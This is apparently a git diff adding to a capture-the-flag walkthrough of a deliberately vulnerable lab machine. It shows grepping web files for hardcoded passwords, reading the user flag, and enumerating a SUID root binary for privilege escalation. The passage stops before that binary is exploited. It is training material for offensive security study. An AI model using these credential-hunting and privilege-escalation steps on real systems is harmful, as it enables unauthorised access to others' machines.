@@ -118,6 +118,83 @@ Upload `/usr/share/webshells/php/php-reverse-shell.php` after modifying it to in
 - `n`: line number 
 - `w`: match the whole word
 - `e`: the pattern used during the search
+- Result:
+```
+/var/www/html/cdn-cgi/login/db.php:2:$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+```
+
+**WALK-THROUGH:** Used `cat` piped to `grep` to look for passwords... (but you have to be in the right subdir; mine was a broader approach and therefore better)
+```
+cd /var/www/html/cdn-cgi/login
+ls
+ # admin.php
+ # db.php
+ # index.php
+ # script.js
+cat * | grep -i passw*
+```
+Results: 
+```
+if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
+<input type="password" name="password" placeholder="Password" />
+```
+**NOTE:** robert's password is NOT `MEGACORP_4dm1n!!` but rather `M3g4C0rpUs3r!`
+
+## Flag: user 
+- `cd` over to robert's home dir and cat the `user.txt` file:
+```
+robert@oopsie:~$ cat user.txt
+cat user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+```
+
+## PrivEsc 
+
+We have user access but not root. 
+
+`sudo -l` to list (`-l`) out the sudo commands our user can run: 
+```
+robert@oopsie:~$ sudo -l
+[sudo] password for robert: M3g4C0rpUs3r!
+Sorry, user robert may not run sudo on oopsie.
+```
+
+`id`: The `id` command in Linux is used to find out user and group names and numeric ID’s (UID or group ID) of the current user or any other user in the server. 
+- Basic Syntax: `id [OPTION]… [USER]`
+```
+id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+```
+- Results: robert is part of the bugtracker group
+- Let's find some files in the bugtracker group:
+```
+find / -group bugtracker 2>/dev/null
+/usr/bin/bugtracker
+```
+- Check out that file: It's owned by root... and it has the **SUID** bit set...
+```
+ls -la /usr/bin/bugtracker
+-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 bugtracker
+
+file /usr/bin/bugtracker
+bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
+```
+
+![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/9f54c0ae-7e9d-4d98-abbb-2ffa96c4f3db)
+
+> Commonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here. In our case, the binary 'bugtracker' is owned by root & we can execute it as root since it has SUID set.
+
+If you run that file (`./bugtracker`), it asks for input. Enter whatever and you get some feedback (it runs `cat` on your input as if it were a file name in `/root/reports/`): 
+```
+./bugtracker
+------------------
+: EV Bug Tracker :
+------------------
+Provide Bug ID: 12
+12
+---------------
+cat: /root/reports/12: No such file or directory
+```
 
 
 
